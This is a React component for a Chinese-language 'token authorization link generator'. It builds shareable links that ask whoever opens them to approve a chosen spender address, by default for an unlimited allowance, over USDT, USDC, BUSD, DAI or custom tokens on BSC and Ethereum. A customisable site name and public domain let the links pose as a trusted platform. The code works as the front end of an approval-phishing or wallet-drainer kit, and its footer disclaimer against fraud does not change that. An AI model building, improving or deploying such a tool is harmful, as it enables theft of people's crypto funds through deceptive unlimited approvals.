import React, { useState } from 'react';
import './HomePage.css';

// 网络配置
const NETWORK_CONFIGS = {
  // BSC主网
  56: {
    name: 'BSC',
    nativeCurrency: 'BNB',
    rpcUrl: 'https://bsc-dataseed.binance.org/',
    blockExplorer: 'https://bscscan.com',
    tokens: {
      USDT: '0x55d398326f99059fF775485246999027B3197955',
      BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
      USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d'
    }
  },
  // BSC测试网
  97: {
    name: 'BSC测试网',
    nativeCurrency: 'tBNB',
    rpcUrl: 'https://data-seed-prebsc-1-s1.binance.org:8545',
    blockExplorer: 'https://testnet.bscscan.com',
    tokens: {
      USDT: '0x337610d27c682E347C9cD60BD4b3b107C9d34dDd'
    }
  },
  // 以太坊主网
  1: {
    name: '以太坊',
    nativeCurrency: 'ETH',
    rpcUrl: 'https://mainnet.infura.io/v3/your-project-id',
    blockExplorer: 'https://etherscan.io',
    tokens: {
      USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
    }
  },
  // 本地开发
  1337: {
    name: '本地网络',
    nativeCurrency: 'ETH',
    rpcUrl: 'http://localhost:8545',
    blockExplorer: '',
    tokens: {
      USDT: '0x5FbDB2315678afecb367f032d93F642f64180aa3'
    }
  }
};

function HomePage() {
  const [spenderAddress, setSpenderAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [tokenAddress, setTokenAddress] = useState('');
  const [siteName, setSiteName] = useState('');
  const [unlimited, setUnlimited] = useState(true);
  const [generatedLink, setGeneratedLink] = useState('');
  const [selectedNetwork, setSelectedNetwork] = useState(56); // 默认BSC主网
  const [selectedToken, setSelectedToken] = useState('USDT'); // 默认USDT
  const [usePresetTokens, setUsePresetTokens] = useState(true); // 默认使用预设代币
  const [customDomain, setCustomDomain] = useState(''); // 自定义域名

  // 获取当前网络的代币列表
  const getNetworkTokens = () => {
    if (!NETWORK_CONFIGS[selectedNetwork] || !NETWORK_CONFIGS[selectedNetwork].tokens) {
      return {};
    }
    return NETWORK_CONFIGS[selectedNetwork].tokens;
  };

  // 当网络改变时，重置代币选择
  const handleNetworkChange = (networkId) => {
    setSelectedNetwork(parseInt(networkId));
    const tokens = NETWORK_CONFIGS[networkId].tokens;
    if (tokens) {
      const tokenSymbols = Object.keys(tokens);
      if (tokenSymbols.length > 0 && !tokens[selectedToken]) {
        setSelectedToken(tokenSymbols[0]);
      }
    }
  };

  const handleGenerateLink = () => {
    if (!spenderAddress) {
      alert('请输入接收授权地址');
      return;
    }

    if (!unlimited && (!amount || parseFloat(amount) <= 0)) {
      alert('请输入有效的授权金额');
      return;
    }

    // 构建授权链接
    // 如果用户提供了自定义域名，则使用它，否则使用当前域名
    const domain = customDomain ? customDomain.trim() : window.location.origin;
    // 确保域名格式正确
    const formattedDomain = domain.startsWith('http') ? domain : `https://${domain}`;

    // 为GitHub Pages添加仓库路径
    let baseUrl;
    if (!customDomain && process.env.PUBLIC_URL) {
      // 使用PUBLIC_URL来获取GitHub Pages的完整路径
      baseUrl = `${window.location.origin}${process.env.PUBLIC_URL}/token-auth`;
    } else {
      baseUrl = `${formattedDomain}/token-auth`;
    }

    const amountParam = unlimited ? 'unlimited' : amount;

    // 确定要使用的代币地址
    let actualTokenAddress = usePresetTokens
      ? NETWORK_CONFIGS[selectedNetwork].tokens[selectedToken]
      : tokenAddress;

    if (!actualTokenAddress && usePresetTokens) {
      alert('您选择的网络没有可用的预设代币');
      return;
    }

    if (!actualTokenAddress && !usePresetTokens) {
      alert('请输入代币地址');
      return;
    }

    let url = `${baseUrl}?network=${selectedNetwork}&spender=${spenderAddress}&amount=${amountParam}`;

    // 如果使用预设代币，添加代币符号；否则添加代币地址
    if (usePresetTokens) {
      url += `&symbol=${selectedToken}`;
    } else {
      url += `&token=${actualTokenAddress}&symbol=TOKEN`;
    }

    // 如果有站点名称，则添加到URL
    if (siteName) {
      url += `&site=${encodeURIComponent(siteName)}`;
    }

    setGeneratedLink(url);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
    alert('链接已复制到剪贴板');
  };

  return (
    <div className="home-container">
      <header className="home-header">
        <h1>代币授权链接生成器</h1>
        <p>生成安全的代币授权链接，用户点击后即可一键授权</p>
      </header>

      <main className="home-content">
        <div className="form-card">
          <h2>生成授权链接</h2>

          <div className="form-group">
            <label>接收授权地址 (您的地址)</label>
            <input
              type="text"
              placeholder="0x..."
              value={spenderAddress}
              onChange={(e) => setSpenderAddress(e.target.value)}
            />
          </div>

          <div className="form-group">
            <label>服务域名 (用于生成可公开访问的链接)</label>
            <input
              type="text"
              placeholder="例如: yoursite.com 或 https://yoursite.com"
              value={customDomain}
              onChange={(e) => setCustomDomain(e.target.value)}
            />
            <small className="domain-tip">
              留空则使用当前域名。部署到GitHub Pages后，此处可填写"您的用户名.github.io/wallet-auth"。
            </small>
          </div>

          <div className="form-group">
            <label>选择网络</label>
            <select value={selectedNetwork} onChange={(e) => handleNetworkChange(e.target.value)}>
              {Object.keys(NETWORK_CONFIGS).map(networkId => (
                <option key={networkId} value={networkId}>
                  {NETWORK_CONFIGS[networkId].name}
                </option>
              ))}
            </select>
          </div>

          <div className="form-group checkbox-group">
            <label>
              <input
                type="checkbox"
                checked={usePresetTokens}
                onChange={(e) => setUsePresetTokens(e.target.checked)}
              />
              使用预设代币
            </label>
          </div>

          {usePresetTokens ? (
            <div className="form-group">
              <label>选择代币</label>
              <select value={selectedToken} onChange={(e) => setSelectedToken(e.target.value)}>
                {Object.keys(getNetworkTokens()).map(symbol => (
                  <option key={symbol} value={symbol}>
                    {symbol} ({NETWORK_CONFIGS[selectedNetwork].tokens[symbol].substring(0, 6)}...{NETWORK_CONFIGS[selectedNetwork].tokens[symbol].substring(38)})
                  </option>
                ))}
              </select>
            </div>
          ) : (
            <div className="form-group">
              <label>自定义代币地址</label>
              <input
                type="text"
                placeholder="0x..."
                value={tokenAddress}
                onChange={(e) => setTokenAddress(e.target.value)}
              />
            </div>
          )}

          <div className="form-group">
            <label>站点名称 (可选)</label>
            <input
              type="text"
              placeholder="您的平台名称"
              value={siteName}
              onChange={(e) => setSiteName(e.target.value)}
            />
          </div>

          <div className="form-group checkbox-group">
            <label>
              <input
                type="checkbox"
                checked={unlimited}
                onChange={(e) => setUnlimited(e.target.checked)}
              />
              无限授权 (授权无限额度)
            </label>
          </div>

          {!unlimited && (
            <div className="form-group">
              <label>授权金额</label>
              <input
                type="number"
                placeholder="输入授权金额"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                min="0.000001"
                step="0.000001"
              />
            </div>
          )}

          <button className="generate-button" onClick={handleGenerateLink}>
            生成授权链接
          </button>
        </div>

        {generatedLink && (
          <div className="result-card">
            <h3>生成的授权链接</h3>
            <div className="link-box">
              <input type="text" value={generatedLink} readOnly />
              <button onClick={copyToClipboard}>复制</button>
            </div>
            {!customDomain && (
              <div className="domain-warning">
                <p>⚠️ 警告：当前链接使用本地地址，其他人无法访问。请在"服务域名"中填写您的公网域名。</p>
              </div>
            )}
            <p className="usage-tip">
              用户点击链接后，将出现授权界面，只需连接钱包并确认即可完成授权。
              授权将在{NETWORK_CONFIGS[selectedNetwork].name}网络上进行。
            </p>
          </div>
        )}
      </main>

      <footer className="home-footer">
        <p>免责声明: 本工具仅用于合法用途，任何使用不当导致的损失，开发者概不负责。请勿用于诈骗等违法活动。</p>
      </footer>
    </div>
  );
}

export default HomePage; 